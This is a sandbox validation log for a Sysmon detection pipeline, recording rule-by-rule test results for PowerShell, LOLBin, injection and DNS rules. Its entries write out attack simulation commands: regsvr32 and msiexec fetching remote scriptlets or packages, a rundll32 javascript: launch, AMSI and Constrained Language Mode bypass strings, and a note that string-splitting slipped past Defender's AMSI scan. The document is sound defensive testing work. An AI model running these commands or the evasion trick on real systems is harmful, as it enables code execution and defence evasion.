# Phase 4B — Rule Validation Log

## ShadowSensor — Sandbox Validation Results

**Start date:** 2026-07-07
**Validator:** Ayush
**Environment:** VMware Windows 10 Pro sandbox VM
**Sysmon config:** C:\sysmon\sysmonconfig-export.xml (locked)
**Pipeline baseline:** 48 rules loaded

---

## Summary Table

| Rule ID | Event ID | Result | Family Enrichment | FP Notes |
|---|---|---|---|---|
| PS_ENCODED_CMD_001 | 1 | PASS | General commodity phishing loaders | None |
| PS_DOWNLOAD_CRADLE_001 | 1 | PASS | Emotet, QBot | None |
| PS_HIDDEN_WINDOW_001 | 1 | PASS | General fileless loaders | None |
| PS_DOWNLOAD_CRADLE_001 (Subphase 7 update) | 1 | PASS — deferred FP tuning check CLOSED, no FP observed | Emotet, QBot | No FP during 18m06s clean benign baseline; see detailed entry addendum |
| PS_HIDDEN_WINDOW_001 (Subphase 7 update) | 1 | PASS — deferred FP tuning check CLOSED, no FP observed | General fileless loaders | No FP during 18m06s clean benign baseline; see detailed entry addendum |
| PS_AMSI_BYPASS_001 | 1 | PARTIAL — Defender interference | Cobalt Strike, Empire | Not a rule/pipeline bug — see detailed entry |
| PS_EXECUTION_POLICY_BYPASS_001 | 1 | PASS (incidental) | Emotet, QBot | Needs dedicated clean re-test |
| PS_INVOKE_EXPRESSION_001 | 1 | PASS (incidental) | Emotet, TrickBot | Co-fired correctly with download cradle |
| PS_VERSION_DOWNGRADE_001 | 1 | PASS | Cobalt Strike, Empire | None — fired correctly despite PSv2 runtime error |
| PS_REFLECTIVE_ASSEMBLY_001 | 1 | PASS | Cobalt Strike, PowerSploit, FIN7 | None |
| PS_CREDENTIAL_ACCESS_001 | 1 | PARTIAL — Defender interference | Mimikatz, PowerSploit, APT29 | Not a rule/pipeline bug — see detailed entry |
| PS_CONSTRAINED_LANG_BYPASS_001 | 1 | PASS | AppLocker/WDAC bypass tooling | None |
| PS_WMI_EXEC_001 | 1 | PASS (confirmed on re-test) | APT29, FIN7, Lazarus | Initial attempt gave false FAIL due to simulation methodology (command typed into already-open shell, no new process created); re-test with forced new-process invocation passed cleanly |
| LOLBIN_MSHTA_001 | 1 | PASS | Various commodity loaders | None |
| LOLBIN_RUNDLL32_SUSPICIOUS_001 | 1 | PASS (upgraded from PARTIAL in Subphase 6) | Various commodity loaders | javascript:/RunHTMLApplication variant blocked at launch (Defender interference, retained as sub-note); confirmed PASS via shell32.dll,ShellExec_RunDLL variant during Subphase 6 CHAIN_LOLBIN_CHILD_001 testing |
| LOLBIN_REGSVR32_001 | 1 | PASS (upgraded from PARTIAL in Subphase 6) | Squiblydoo campaigns | Remote-scriptlet variant blocked at launch (Defender interference, retained as sub-note); confirmed PASS via local-SCT-file variant during Subphase 6 CHAIN_REGSVR32_CHILD_001 testing |
| LOLBIN_CERTUTIL_001 | 1 | PASS | Various APT, commodity loaders | None |
| LOLBIN_MSIEXEC_REMOTE_001 | 1 | PASS | APT10, FIN7 | None |
| LOLBIN_ODBCCONF_001 | 1 | PASS | FIN7, Cobalt Strike | Initial apparent FAIL traced to a stalled/non-running pipeline process, not a rule defect — see detailed entry |
| LOLBIN_CMSTP_001 | 1 | PASS | MuddyWater, APT29 | None |
| LOLBIN_HH_CHM_001 | 1 | PASS | Lazarus Group | None |
| LOLBIN_REGASM_REGSVCS_001 | 1 | PASS | Various APT post-exploitation chains | None — both RegAsm.exe and RegSvcs.exe fired correctly |
| LOLBIN_WMIC_PROCESS_001 | 1 | PASS | APT29, Lazarus, FIN7 | None |
| LOLBIN_BITSADMIN_001 | 1 | PASS | APT10, APT33 | None |
| LOLBIN_INSTALLUTIL_001 | 1 | PASS | Red team tooling, various APT | None |
| LOLBIN_FORFILES_001 | 1 | PASS | Commodity downloaders | None |
| API_AV_PROCESS_ACCESS_001 | 10 | CONFIRMED FP (recurring) | N/A — system noise | csrss.exe/conhost.exe → MpCmdRun.exe/MsMpEng.exe, 25+ occurrences across 4+ sessions (including a new recurrence in Subphase 4 at 21:49:06 and 22:03:49), zero test-driven |
| API_CREATE_REMOTE_THREAD_001 | 8 | CONFIRMED FP (recurring, escalated) | N/A — system noise pending root cause | 15+ occurrences in ~2.5 min in Subphase 2, more recurrences in Subphase 3/4 with target sometimes resolving to whatever process was being blocked/killed at that moment; strongly correlated with blocked/failed native process launches; possible shared root cause with `NET_DNS_SCRIPT_ENGINE_001`'s process-resolution bug (see Cross-Cutting Issue 6) |
| API_CREATE_REMOTE_THREAD_001 (Subphase 7 update) | 8 | CONFIRMED FP — 5th occurrence, unresolved, routed to Codex (unchanged, still open) | N/A — system noise pending root cause | msedge.exe → target='msdt.exe' (confirmed never a live process via Get-WinEvent); during clean benign baseline, no deliberate technique — see Issue 2 update |
| NET_DNS_LONG_QUERY_001 | 22 | Provisional FP (SearchApp.exe) + confirmed genuine PASS (dedicated trigger) | N/A — system noise for the FP; Iodine, DNScat2 for the genuine detection | SearchApp.exe FP still pending Subphase 7 baseline confirmation; separately, the rule fired cleanly and correctly on a deliberate long-hostname PowerShell query in Subphase 4 — see detailed entry below |
| NET_DNS_LONG_QUERY_001 (Subphase 7 update — Issue 3 CONFIRMED) | 22 | CONFIRMED FP (SearchApp.exe) — upgraded from provisional, routed to Codex + PASS (genuine, unchanged from Subphase 4) | N/A — system noise for the FP; Iodine, DNScat2 for the genuine detection | 3rd independent test-activity-free occurrence, query name confirmed: `b59dd060c31a5268a4dd55e6dc581400.azr.footprintdns.com` (legitimate Microsoft telemetry domain) — see detailed entry addendum and updated Issue 3 |
| API_OPEN_PROCESS_SUSPICIOUS_ACCESS_001 | 10 | Needs review (not yet classified) | N/A — pending classification | wmiprvse.exe → winlogon.exe/lsass.exe, observed immediately following PS_WMI_EXEC_001 WMI process-creation test; may be legitimate WMI provider housekeeping or a new FP surface |
| API_OPEN_PROCESS_SUSPICIOUS_ACCESS_001 (Subphase 7 update — Issue 4 left open) | 10 | Needs review — inconclusive, downgraded from "escalating toward likely-FP," NOT routed to Codex | N/A — pending further evidence | Zero occurrences in clean 18m06s baseline window (no WMI); however 10 pre-baseline wmiprvse.exe hits observed just before the session restart — both source-process variants remain independently reproducible; left open for Phase 5+ |
| NET_POWERSHELL_HTTP_001 | 3 | PASS | Emotet, general commodity loaders | None — confirmed via dedicated TcpClient test against example.com:443 after loopback-based tests proved inconclusive |
| NET_SCRIPTING_ENGINE_HTTP_001 | 3 | PARTIAL — environment-limited (confirmed) | Emotet, QBot | Not a rule bug — COM-based MSXML2.XMLHTTP calls from wscript.exe do not generate a Sysmon EID 3 event in this environment; see detailed entry |
| NET_LOLBIN_PROCESS_HTTP_001 | 3 | PASS (via msiexec.exe) | Various commodity loaders | mshta.exe variant of this same rule is separately environment-limited (see detailed entry) — msiexec.exe variant confirms rule logic is correct |
| NET_SUSPICIOUS_PORT_001 | 3 | PARTIAL — environment-limited (confirmed) | Metasploit (port 4444 reverse shell) | Not a rule bug — Sysmon config's EID 3 `include` filter restricts capture to ports 80/443 only; port 4444 traffic is never logged by Sysmon regardless of rule logic |
| NET_LOLBIN_NETWORK_001 | 3 | PASS (via msiexec.exe) | Various LOLBin abuse campaigns | None |
| NET_SMB_LATERAL_001 | 3 | PARTIAL — environment-limited (confirmed) | APT29, Emotet lateral movement | Not a rule bug — same Sysmon EID 3 port 80/443-only include filter; port 445 traffic never reaches the rule engine |
| NET_DNS_LONG_QUERY_001 | 22 | See entry above (duplicate ID — same rule row) | — | — |
| NET_DNS_SCRIPT_ENGINE_001 | 22 | FAIL — CONFIRMED BUG, route to Codex | Commodity script-based loaders | Sysmon EID 22 event genuinely fired for the wscript.exe DNS query, but `Image`/`ProcessGuid` fields resolved to `<unknown process>`/all-zero GUID, so the rule could not match on process name — this is a normalizer/attribution bug, not a telemetry gap |
| API_OPEN_PROCESS_SUSPICIOUS_ACCESS_001 | 10 | PASS (re-validated) | Mimikatz, credential dumping tools | Re-fired cleanly via `vm_tp_test_03_chains_api_network.ps1`; Issue 4 pattern not re-observed in this specific re-test window, but see Issue 4 update — a later independent recurrence via a different (non-WMI) source process strengthens the case this is a genuine FP surface |
| API_CREATE_REMOTE_THREAD_001 | 8 | PASS (confirmed) + PARTIAL (Atomic T1055.003 blocked by Defender) | Cobalt Strike, Metasploit (CreateRemoteThread injection) | Genuine clean hit confirmed (powershell.exe→notepad.exe); Atomic T1055.003's `InjectContext.exe` blocked outright by Defender before executing; separately, a second recurrence of the unresolved python.exe-sourced `<unknown process>` target anomaly was captured (see Issue 2 update) |
| API_DLL_LOAD_SUSPICIOUS_PATH_001 | 7 | ENVIRONMENT-LIMITED (confirmed) | PowerSploit (Invoke-ReflectivePEInjection), Cobalt Strike reflective DLL loading | Not a rule bug — pure-IL managed .NET assembly (`Add-Type -OutputType Library`) loaded via `Assembly.LoadFile()` never generated a Sysmon EID 7 event across a full-window audit, despite the load provably succeeding |
| API_LOLBIN_DLL_UNSIGNED_001 | 7 | ENVIRONMENT-LIMITED (confirmed) | Various LOLBin DLL sideloading campaigns | Not a rule bug — `rundll32.exe` load of the same pure-IL test DLL also produced zero EID 7 events (confirmed via full EID 7 window audit), despite `rundll32`'s own "Missing entry: Run" error dialog proving the `LoadLibrary` step itself succeeded |
| API_OPEN_PROCESS_VM_WRITE_001 | 10 | ENVIRONMENT-LIMITED (confirmed) | Metasploit, Cobalt Strike (classic DLL injection) | Not a rule bug — Atomic T1055.001 (mavinject.exe injection into notepad.exe) confirmed executed via EID 1 (correct parent-child chain visible), but zero EID 10 events with `SourceImage=mavinject.exe` exist anywhere in the test window |
| API_TOKEN_MANIPULATION_001 | 10 | PARTIAL — Defender interference (confirmed) | Cobalt Strike (steal_token), PowerSploit (Invoke-TokenManipulation) | Not a rule bug — Atomic T1134.001's payload download blocked by Defender AMSI before the named-pipe impersonation technique could execute; incidentally triggered `PS_DOWNLOAD_CRADLE_001` and `NET_POWERSHELL_HTTP_001` on the blocked download attempt |
| API_AV_PROCESS_ACCESS_001 | 10 | ENVIRONMENT-LIMITED (deliberate-trigger path, confirmed) | Various AV termination tools | Not a rule bug for the deliberate test — `OpenProcess(PROCESS_TERMINATE)` against MsMpEng.exe returned a NULL handle, consistent with PPL blocking the call before Sysmon could observe it; the rule's pre-existing unrelated persistent FP (Issue 1) recurred again in a later independent session |
| CHAIN_OFFICE_POWERSHELL_001 | 1 | PASS (re-validated) | Macro-based phishing, Emotet | None |
| CHAIN_OFFICE_CMD_001 | 1 | PASS (re-validated) | Macro-based phishing | None |
| CHAIN_SCRIPT_HOST_CMD_001 | 1 | PASS (re-validated) | Commodity VBScript/JScript loaders | None |
| CHAIN_SCRIPT_HOST_POWERSHELL_001 | 1 | PASS (re-validated) | Commodity VBScript/JScript loaders | None |
| CHAIN_BROWSER_SHELL_001 | 1 | PASS (via custom protocol handler) | Drive-by download campaigns, watering hole attacks | ms-msdt: URI variant separately confirmed non-functional on this patched Windows build (prompt accepted but no msdt.exe process ever created) — not a rule defect, see detailed entry |
| CHAIN_OFFICE_WSCRIPT_001 | 1 | SKIPPED — Office not installed | Macro-based loaders writing and executing .vbs droppers | Office-application-as-parent path already validated via CHAIN_OFFICE_POWERSHELL_001/CHAIN_OFFICE_CMD_001; only the wscript.exe child type is untested |
| CHAIN_REGSVR32_CHILD_001 | 1 | PASS | Squiblydoo campaigns, various APT | None — also resolved LOLBIN_REGSVR32_001's Subphase 3 PARTIAL as a side effect (see that rule's updated entry) |
| CHAIN_SCHEDULED_TASK_SCRIPT_001 | 1 | FAIL — CONFIRMED BUG, route to Codex | Emotet, QBot (scheduled task persistence mechanism) | Not a simulation/environment issue — technique executed correctly and was fully captured by Sysmon, but rule's parent-image list lacks svchost.exe (hosting the Schedule service on this Windows version), so it never matched |
| CHAIN_LOLBIN_CHILD_001 | 1 | PASS (via rundll32.exe ShellExec_RunDLL) | Various LOLBin abuse chains | mshta.exe javascript:/ActiveXObject variant blocked at launch (Defender interference) — same interference class as LOLBIN_RUNDLL32_SUSPICIOUS_001/LOLBIN_REGSVR32_001's remote variants; rule logic confirmed correct via the rundll32 ShellExec_RunDLL path |

---

## Detailed Results

## PS_ENCODED_CMD_001
**Rule name:** PowerShell Encoded Command
**Event ID:** 1
**Simulation command:** `vm_tp_test_01_powershell.ps1` (Part 1) — `-EncodedCommand JABjAG0AZAAgACcAVABlAHMAdAAnAA==`
**Expected pipeline output:** `RULE_HIT | PS_ENCODED_CMD_001`
**Observed result:** PASS
**Actual pipeline output:** `[2026-07-06 23:07:08] RULE_HIT | ... id=PS_ENCODED_CMD_001 ... severity=High`
**Family enrichment note:** General commodity phishing loaders.
**FP notes:** None.
**Notes:** Clean fire, matched expected rule exactly.

---

## PS_DOWNLOAD_CRADLE_001
**Rule name:** PowerShell Download Cradle
**Event ID:** 1
**Simulation command:** `vm_tp_test_01_powershell.ps1` (Part 1) — IEX+DownloadString via cmd.exe parent
**Expected pipeline output:** `RULE_HIT | PS_DOWNLOAD_CRADLE_001`
**Observed result:** PASS
**Actual pipeline output:** `[2026-07-06 23:07:22] RULE_HIT | ... id=PS_DOWNLOAD_CRADLE_001 ... parent='C:\Windows\System32\cmd.exe'`
**Family enrichment note:** Emotet, QBot IEX+DownloadString staging pattern.
**FP notes:** None.
**Notes:** Phase 2B parent_image exclusion working correctly.

**Subphase 7 addendum — deferred FP tuning check (from Phase 2B):** During the clean Subphase 7 benign baseline session (session boundary `22:49:29`–`23:07:35`, 18 minutes 6 seconds, confirmed via `rule_hits.log` SESSION START/END markers), covering Edge browsing, File Explorer navigation, Task Manager, PowerShell (`Get-Process`, `Get-Service`, `dir C:\Windows`), Notepad, and idle time, this rule did **not** fire on any benign activity. **Deferred FP-tuning concern is now resolved — no exclusion required. Verdict stands as PASS with no open FP concern.**

---

## PS_HIDDEN_WINDOW_001
**Rule name:** PowerShell Hidden Window
**Event ID:** 1
**Simulation command:** `vm_tp_test_01_powershell.ps1` (Part 1) — `-W Hidden`, cmd.exe parent
**Expected pipeline output:** `RULE_HIT | PS_HIDDEN_WINDOW_001`
**Observed result:** PASS
**Actual pipeline output:** `[2026-07-06 23:07:33] RULE_HIT | ... id=PS_HIDDEN_WINDOW_001 ... parent='C:\Windows\System32\cmd.exe'`
**Family enrichment note:** General fileless loaders.
**FP notes:** None.
**Notes:** Task Scheduler exclusion correctly not triggered (cmd.exe parent).

**Subphase 7 addendum — deferred FP tuning check (from Phase 2B):** Same clean Subphase 7 benign baseline session as documented under `PS_DOWNLOAD_CRADLE_001` above (`22:49:29`–`23:07:35`, 18 minutes 6 seconds). This rule also did **not** fire on any benign activity. **Deferred FP-tuning concern is now resolved — no exclusion required. Verdict stands as PASS with no open FP concern.**

---

## PS_AMSI_BYPASS_001
**Rule name:** PowerShell AMSI Bypass Attempt
**Event ID:** 1
**Simulation command:** `[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')`
**Expected pipeline output:** `RULE_HIT | PS_AMSI_BYPASS_001`
**Observed result:** PARTIAL — environment interference, not a rule/pipeline defect
**Actual pipeline output:** No hit today; historical hit confirmed 2026-06-27 00:13:15 on identical command line.
**Family enrichment note:** Cobalt Strike, Empire.
**FP notes:** None.
**Notes:** Root cause confirmed via Windows Defender Operational log — signature `Trojan:PowerShell/PsAttack.A` (ID 2147725500, Severity: Severe) removes this exact command line before Sysmon logs a usable EID 1. Rule pattern independently confirmed correct via static YAML review and historical precedent. No Codex action required. Research paper note: legitimate Section 3 finding re: native AV pre-empting Sysmon telemetry for AMSI-flavored command lines.

---

## PS_EXECUTION_POLICY_BYPASS_001
**Rule name:** PowerShell Execution Policy Bypass
**Event ID:** 1
**Simulation command:** Incidental — test harness's own `-ExecutionPolicy Bypass -File ...` launch flag
**Expected pipeline output:** `RULE_HIT | PS_EXECUTION_POLICY_BYPASS_001`
**Observed result:** PASS (incidental)
**Actual pipeline output:** `[2026-07-06 23:07:06] RULE_HIT | ... id=PS_EXECUTION_POLICY_BYPASS_001 ... severity=Medium`
**Family enrichment note:** Emotet, QBot.
**FP notes:** Not a false positive — correctly detected the harness's own bypass flag.
**Notes:** Dedicated isolated re-test still recommended for a clean log entry. (Note: this rule fired again incidentally in Subphase 4 as well, at 21:38:01/23:56:37/21:38:58 across different test runs — same incidental cause each time, script's own launch flags. No new information.)

---

## PS_INVOKE_EXPRESSION_001
**Rule name:** PowerShell Invoke-Expression with Encoded or Downloaded Content
**Event ID:** 1
**Simulation command:** Incidental — co-fired with PS_DOWNLOAD_CRADLE_001's test command
**Expected pipeline output:** `RULE_HIT | PS_INVOKE_EXPRESSION_001`
**Observed result:** PASS
**Actual pipeline output:** `[2026-07-06 23:07:22] RULE_HIT | ... id=PS_INVOKE_EXPRESSION_001 ... severity=High`
**Family enrichment note:** Emotet, TrickBot.
**FP notes:** None.
**Notes:** Dual-condition AND logic (IEX + download/decode keyword) correctly co-matched.

---

## PS_VERSION_DOWNGRADE_001
**Rule name:** PowerShell Version 2 Downgrade Attack
**Event ID:** 1
**Simulation command:** `powershell.exe -Version 2 -NoProfile -Command "Write-Host 'Phase 4B simulation: PSv2 downgrade'"`
**Expected pipeline output:** `RULE_HIT | PS_VERSION_DOWNGRADE_001`
**Observed result:** PASS
**Actual pipeline output:** `[2026-07-06 23:24:17] RULE_HIT | rule='PowerShell Version 2 Downgrade Attack' | id=PS_VERSION_DOWNGRADE_001 | technique=T1059.001 | tactic=Defense Evasion | severity=High | cmdline='"...powershell.exe" -Version 2 -NoProfile -Command "Write-Host '\''Phase 4B simulation: PSv2 downgrade'\''"' | parent='...powershell.exe'`
**Family enrichment note:** Cobalt Strike, Empire — PSv2 downgrade to bypass Script Block Logging/AMSI/CLM.
**FP notes:** None.
**Notes:** PSv2 itself is not installed on this VM (.NET Framework v2.0.50727 missing error), but the rule correctly fired on the command-line pattern at process creation, independent of runtime success — exactly matching the spec's expected behavior ("EID 1 still fires on process creation; the error does not prevent detection").

---

## PS_REFLECTIVE_ASSEMBLY_001
**Rule name:** PowerShell Reflective Assembly Loading
**Event ID:** 1
**Simulation command:** `powershell.exe -NoProfile -Command "[System.Reflection.Assembly]::LoadWithPartialName('System.Windows.Forms'); Write-Host 'Phase 4B simulation: reflective assembly load'"`
**Expected pipeline output:** `RULE_HIT | PS_REFLECTIVE_ASSEMBLY_001`
**Observed result:** PASS
**Actual pipeline output:** `[2026-07-06 23:31:59] RULE_HIT | rule='PowerShell Reflective Assembly Loading' | id=PS_REFLECTIVE_ASSEMBLY_001 | technique=T1620 | tactic=Defense Evasion | severity=High`
**Family enrichment note:** Cobalt Strike (powershell-import), PowerSploit (Invoke-ReflectivePEInjection), FIN7/Carbanak.
**FP notes:** None.
**Notes:** Fired correctly on the `LoadWithPartialName` reflection call; loaded assembly was the benign signed `System.Windows.Forms` from GAC, confirming detection is on the reflection method pattern rather than payload content, as designed.

---

## PS_CREDENTIAL_ACCESS_001
**Rule name:** PowerShell Credential Dumping Tool Signatures
**Event ID:** 1
**Simulation command:** `powershell.exe -NoProfile -Command "Write-Host 'Phase 4B detection simulation: Invoke-Mimikatz sekurlsa lsadump pattern test'"`
**Expected pipeline output:** `RULE_HIT | PS_CREDENTIAL_ACCESS_001`
**Observed result:** PARTIAL — environment interference, not a rule/pipeline defect
**Actual pipeline output:** No hit — command blocked outright by Windows Defender AMSI scanner (`ScriptContainedMaliciousContent`, `ParentContainsErrorRecordException`) before PowerShell could parse/execute it.
**Family enrichment note:** Mimikatz, PowerSploit (Invoke-Mimikatz), APT29 (Invoke-DCSync).
**FP notes:** None.
**Notes:** Same interference class as PS_AMSI_BYPASS_001. Follow-up test using a split-variable reconstruction (`$a = 'privilege' + '::debug'`) successfully evaded the AMSI static scan and ran cleanly, but did not trigger the rule either — because the reconstructed string only exists at runtime and never appears as a literal substring in the Sysmon-logged `-Command` argument text. Confirms the rule's pattern is sound; live re-fire of this specific rule category is not achievable via direct simulation in this environment because any string obfuscation that evades Defender's AMSI layer also defeats a literal command-line substring match — this is itself a legitimate research observation about the inherent limitation of command-line-pattern-based detection against obfuscated credential-access tooling. No Codex action required.

---

## PS_CONSTRAINED_LANG_BYPASS_001
**Rule name:** PowerShell Constrained Language Mode Bypass via Environment Variable
**Event ID:** 1
**Simulation command:** `powershell.exe -NoProfile -Command "[System.Environment]::SetEnvironmentVariable('__PSLockdownPolicy', '0', 'Process'); Write-Host 'Phase 4B simulation: CLM bypass'"`
**Expected pipeline output:** `RULE_HIT | PS_CONSTRAINED_LANG_BYPASS_001`
**Observed result:** PASS
**Actual pipeline output:** `[2026-07-07 22:17:28] RULE_HIT | rule='PowerShell Constrained Language Mode Bypass via Environment Variable' | id=PS_CONSTRAINED_LANG_BYPASS_001 | technique=T1562.001 | tactic=Defense Evasion | severity=High`
**Family enrichment note:** AppLocker/WDAC bypass tooling referencing `__PSLockdownPolicy`.
**FP notes:** None.
**Notes:** Clean fire, matched expected rule exactly.

---

## PS_WMI_EXEC_001
**Rule name:** PowerShell WMI-Based Process Execution
**Event ID:** 1
**Simulation command:** `powershell.exe -NoProfile -Command "Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList 'notepad.exe'"`
**Expected pipeline output:** `RULE_HIT | PS_WMI_EXEC_001`
**Observed result:** PASS (confirmed on re-test)
**Actual pipeline output:** `[2026-07-07 22:24:13] RULE_HIT | rule='PowerShell WMI-Based Process Execution' | id=PS_WMI_EXEC_001 | technique=T1047 | tactic=Execution | severity=High`
**Family enrichment note:** APT29, FIN7, Lazarus (wmic/Invoke-WmiMethod lateral movement).
**FP notes:** None.
**Notes:** Initial attempt ran `Invoke-WmiMethod` directly at an already-open interactive PowerShell prompt rather than as a new process invocation — since Sysmon EID 1 only fires on new process creation, no qualifying event was generated and the rule correctly did not fire (confirmed via `Select-String -Path logs\rule_hits.log -Pattern "PS_WMI_EXEC"` returning nothing). Re-test wrapping the same command in a fresh `powershell.exe -Command "..."` invocation produced a clean hit, confirming this was a simulation methodology gap, not a rule defect. Secondary observation: this WMI-based process creation also produced two `API_OPEN_PROCESS_SUSPICIOUS_ACCESS_001` hits (`wmiprvse.exe` → `winlogon.exe` and `wmiprvse.exe` → `lsass.exe`) — logged separately below, not yet classified as FP or legitimate corroborating signal.

---

## LOLBIN_MSHTA_001
**Rule name:** MSHTA Execution
**Event ID:** 1
**Simulation command:** `vm_tp_test_02_lolbins.ps1` — mshta.exe with vbscript Close/Execute chain
**Expected pipeline output:** `RULE_HIT | LOLBIN_MSHTA_001`
**Observed result:** PASS
**Actual pipeline output:** `[2026-07-07 22:31:41] RULE_HIT | rule='MSHTA Execution' | id=LOLBIN_MSHTA_001 | technique=T1218.005 | tactic=Defense Evasion | severity=High`
**Family enrichment note:** Various commodity loaders.
**FP notes:** None.
**Notes:** Also produced an incidental correct hit on `CHAIN_LOLBIN_CHILD_001` (mshta.exe spawning cmd.exe as child) — useful early confirmation for Subphase 6. Also re-fired cleanly twice in Subphase 4 (21:41:04 against 127.0.0.1, 21:59:07 against example.com), confirming the EID 1 process-creation detection is fully independent of destination reachability — see NET_LOLBIN_PROCESS_HTTP_001 entry below for the related (and distinct) EID 3 network-layer finding.

---

## LOLBIN_RUNDLL32_SUSPICIOUS_001
**Rule name:** Rundll32 Suspicious Invocation
**Event ID:** 1
**Simulation command:** `vm_tp_test_02_lolbins.ps1` Part 2 (via Start-Process), then direct `rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";alert(...)` re-attempts
**Expected pipeline output:** `RULE_HIT | LOLBIN_RUNDLL32_SUSPICIOUS_001`
**Observed result:** PASS (upgraded from PARTIAL — Defender/AV interference in Subphase 3, confirmed via a different invocation method in Subphase 6)
**Actual pipeline output:** Subphase 3: No hit — every launch attempt (via `Start-Process` and direct invocation, from both the UNC path and `C:\`) failed with "Access is denied" / `NativeCommandFailed` before the process could execute. Subphase 6: `[2026-07-12 22:26:48] RULE_HIT | rule='Suspicious Rundll32 Execution' | id=LOLBIN_RUNDLL32_SUSPICIOUS_001 | technique=T1218.011 | tactic=Defense Evasion | severity=High | image='C:\Windows\System32\rundll32.exe' | cmdline='rundll32.exe  shell32.dll,ShellExec_RunDLL cmd.exe /c echo Phase 4B LOLBin child simulation v2' | parent='C:\Windows\System32\cmd.exe'` — clean, unambiguous fire, co-firing at the identical timestamp with `CHAIN_LOLBIN_CHILD_001` (see that rule's Subphase 6 entry).
**Family enrichment note:** Various commodity loaders.
**FP notes:** None.
**Notes:** The `javascript:`/`RunHTMLApplication` pattern is a well-known malicious LOLBin signature; consistent blocking across multiple invocation methods (Start-Process, direct call, different working directories) indicates AV/Defender interception at the OS layer rather than an environment or scripting issue. Same interference class as PS_AMSI_BYPASS_001. **Subphase 6 update:** while attempting to validate `CHAIN_LOLBIN_CHILD_001`, the `javascript:`/ActiveXObject invocation style (via mshta.exe) was blocked identically ("Access is denied"), confirming the interference is keyed to that specific invocation signature rather than being rundll32-specific. Switching to the `shell32.dll,ShellExec_RunDLL` invocation style — a different, legitimate LOLBin code path (T1218.011) not sharing the same signature — fired this rule cleanly and without any interference. This gives affirmative proof the rule's YAML condition and matching logic are entirely correct; the Subphase 3 PARTIAL was specifically about Defender intercepting the `javascript:`/`RunHTMLApplication` delivery mechanism, not a blanket inability to validate rundll32-based detection in this environment. No Codex action required — verdict upgraded to PASS, with the javascript:/RunHTMLApplication blocking retained here as a documented, resolved sub-note rather than overwritten.

---

## LOLBIN_REGSVR32_001
**Rule name:** Regsvr32 Squiblydoo / Remote Scriptlet Execution
**Event ID:** 1
**Simulation command:** `vm_tp_test_02_lolbins.ps1` Part 2 (via Start-Process), then direct `regsvr32.exe /s /n /u /i:http://127.0.0.1/nonexistent.sct scrobj.dll` re-attempts
**Expected pipeline output:** `RULE_HIT | LOLBIN_REGSVR32_001`
**Observed result:** PASS (upgraded from PARTIAL — Defender/AV interference in Subphase 3, confirmed via a different invocation method in Subphase 6)
**Actual pipeline output:** Subphase 3: No hit — blocked with "Access is denied" / `NativeCommandFailed` on every attempt, same as the rundll32 case above. Subphase 6: `[2026-07-12 22:20:44] RULE_HIT | rule='Regsvr32 Remote Script Execution' | id=LOLBIN_REGSVR32_001 | technique=T1218.010 | tactic=Defense Evasion | severity=High | image='C:\Windows\System32\regsvr32.exe' | cmdline='regsvr32.exe  /s /u /i:C:\Temp\test_4b.sct scrobj.dll' | parent='C:\Windows\System32\cmd.exe'` — clean, unambiguous fire, co-firing at the identical timestamp with `CHAIN_REGSVR32_CHILD_001` (see that rule's Subphase 6 entry).
**Family enrichment note:** Squiblydoo campaigns.
**FP notes:** None.
**Notes:** Squiblydoo (remote .sct scriptlet via regsvr32) is a well-documented signature; consistent blocking across invocation methods confirms AV/Defender interception, not a rule or pipeline defect. **Subphase 6 update:** revisited via the local-SCT-file variant specified for `CHAIN_REGSVR32_CHILD_001` testing, exactly as flagged here in Subphase 3. The local file (`C:\Temp\test_4b.sct`) loaded via the identical `/s /u /i:... scrobj.dll` structural pattern fired cleanly with zero interference. This gives affirmative proof the rule's YAML condition and matching logic are entirely correct — the Subphase 3 PARTIAL was specifically about Defender intercepting the *remote-URL* delivery mechanism of the Squiblydoo technique, not any defect in the rule itself, and not a blanket inability to trigger regsvr32-based detection in this environment. No Codex action required — verdict upgraded to PASS, with the remote-URL PARTIAL retained here as a documented, resolved sub-note rather than overwritten.

---

## LOLBIN_CERTUTIL_001
**Rule name:** Certutil File Download or Decode
**Event ID:** 1
**Simulation command:** `vm_tp_test_02_lolbins.ps1` Part 2 — certutil -decode on a local test file
**Expected pipeline output:** `RULE_HIT | LOLBIN_CERTUTIL_001`
**Observed result:** PASS
**Actual pipeline output:** `[2026-07-07 22:32:08] RULE_HIT | rule='Certutil File Download or Decode' | id=LOLBIN_CERTUTIL_001 | technique=T1140 | tactic=Defense Evasion | severity=Medium`
**Family enrichment note:** Various APT, commodity loaders.
**FP notes:** None.
**Notes:** Clean fire, matched expected rule exactly.

---

## LOLBIN_MSIEXEC_REMOTE_001
**Rule name:** Msiexec Remote Package Download and Execute
**Event ID:** 1
**Simulation command:** `msiexec.exe /i http://127.0.0.1/test.msi /q` (Subphase 3); re-run against `http://example.com/test.msi` in Subphase 4
**Expected pipeline output:** `RULE_HIT | LOLBIN_MSIEXEC_REMOTE_001`
**Observed result:** PASS
**Actual pipeline output:** `[2026-07-07 22:36:51] RULE_HIT | ...` (Subphase 3, 127.0.0.1); re-fired cleanly again in Subphase 4 at `[2026-07-09 21:43:27]` and `[2026-07-09 21:59:22]`/`21:59:27` (example.com)
**Family enrichment note:** APT10, FIN7.
**FP notes:** None.
**Notes:** Clean fire against both loopback and a real external destination, confirming the EID 1 command-line match is fully independent of destination reachability, as designed.

---

## LOLBIN_ODBCCONF_001
**Rule name:** Odbcconf REGSVR DLL Registration Abuse
**Event ID:** 1
**Simulation command:** `odbcconf.exe /a {REGSVR C:\Windows\System32\mshtml.dll}` (multiple invocation variants tried)
**Expected pipeline output:** `RULE_HIT | LOLBIN_ODBCCONF_001`
**Observed result:** PASS
**Actual pipeline output:** `[2026-07-07 22:42:25] RULE_HIT | ... id=LOLBIN_ODBCCONF_001 ...` and three further hits at `[2026-07-07 22:49:42]`–`[2026-07-07 22:49:43]`
**Family enrichment note:** FIN7, Cobalt Strike post-exploitation.
**FP notes:** None.
